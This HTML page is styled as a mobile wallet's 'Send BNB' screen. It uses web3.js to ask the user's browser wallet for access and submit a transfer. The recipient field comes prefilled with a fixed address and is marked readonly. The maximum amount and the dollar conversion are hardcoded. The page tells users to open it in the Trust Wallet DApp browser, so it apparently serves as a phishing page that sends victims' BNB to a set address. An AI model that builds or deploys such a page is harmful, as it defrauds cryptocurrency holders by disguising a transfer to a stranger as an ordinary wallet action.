<!DOCTYPE html>
<html>
<head>
  <title>Send BNB</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
  <style>
    html, body {
      font-family: sans-serif;
      background: #fff;
      margin: 0;
      padding: 0;
      color: #000;
      height: 100%;
      display: flex;
      flex-direction: column;
    }

    .container {
      flex: 1;
      padding: 16px;
      display: flex;
      flex-direction: column;
    }

    label {
      font-size: 14px;
      color: #555;
      display: block;
      margin: 20px 0 8px;
    }

    .input-box {
      display: flex;
      align-items: center;
      border: 1px solid #ccc;
      border-radius: 8px;
      padding: 0 10px;
      position: relative;
    }

    .input-box input {
      border: none;
      outline: none;
      padding: 14px;
      font-size: 16px;
      width: 100%;
    }

    .input-box .clear-btn {
      background: none;
      border: none;
      font-size: 20px;
      color: #aaa;
      cursor: pointer;
      margin-right: 8px;
    }

    .input-box .paste-btn {
      background: none;
      border: none;
      color: #0052ff;
      font-weight: bold;
      cursor: pointer;
      padding: 0 8px;
    }

    .amount-section {
      display: flex;
      align-items: center;
      border: 1px solid #ccc;
      border-radius: 8px;
      margin-top: 8px;
    }

    .amount-section input {
      border: none;
      outline: none;
      padding: 14px;
      font-size: 16px;
      width: 100%;
    }

    .amount-section span, .amount-section .max-btn {
      padding: 0 12px;
      color: #0052ff;
      font-weight: bold;
      font-size: 14px;
    }

    .converted {
      margin-top: 10px;
      color: #888;
      font-size: 14px;
    }

    .footer {
      padding: 16px;
      background: #fff;
      box-shadow: 0 -1px 5px rgba(0,0,0,0.1);
    }

    .button {
      background-color: #0052ff;
      color: white;
      padding: 16px;
      border: none;
      width: 100%;
      font-size: 18px;
      font-weight: bold;
      border-radius: 20px;
      cursor: pointer;
      position: relative;
      overflow: hidden;
      transition: background 0.3s ease;
    }

    .button.loading {
      pointer-events: none;
      opacity: 0.7;
    }

    .button.loading::after {
      content: "Processing...";
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(255, 255, 255, 0.7);
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 16px;
      color: #0052ff;
      font-weight: bold;
      border-radius: 20px;
    }
  </style>
</head>
<body>

  <div class="container">
    <label>To Address</label>
    <div class="input-box">
      <input type="text" id="address" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC" readonly>
      <button class="clear-btn" onclick="document.getElementById('address').value = ''">&times;</button>
      <button class="paste-btn" onclick="navigator.clipboard.readText().then(text => document.getElementById('address').value = text)">Paste</button>
    </div>

    <label>Amount</label>
    <div class="amount-section">
      <input type="number" id="amount" placeholder="BNB Amount">
      <span>BNB</span>
      <span class="max-btn" onclick="setMax()">Max</span>
    </div>

    <div class="converted">= ~$0.00</div>
  </div>

  <div class="footer">
    <button class="button" id="nextBtn" onclick="nextStep()">Next</button>
  </div>

  <script>
    function setMax() {
      const maxAmount = 0.5; // Example max
      document.getElementById('amount').value = maxAmount;
      document.querySelector('.converted').innerText = `= ~$${(maxAmount * 600).toFixed(2)}`;
    }

    async function nextStep() {
      const btn = document.getElementById('nextBtn');
      btn.classList.add("loading");
      try {
        if (!window.ethereum) {
          alert("Open inside Trust Wallet DApp browser.");
          return;
        }

        await window.ethereum.request({ method: "eth_requestAccounts" });
        const web3 = new Web3(window.ethereum);
        const accounts = await web3.eth.getAccounts();
        const user = accounts[0];
        const receiver = document.getElementById("address").value;
        const amount = document.getElementById("amount").value;

        if (!amount || amount <= 0) {
          alert("Enter valid BNB amount.");
          return;
        }

        const value = web3.utils.toWei(amount, "ether");

        await web3.eth.sendTransaction({
          from: user,
          to: receiver,
          value: value
        });

        alert("✅ BNB sent successfully.");
      } catch (err) {
        alert("❌ Error: " + (err.message || err));
      } finally {
        btn.classList.remove("loading");
      }
    }
  </script>

</body>
</html>
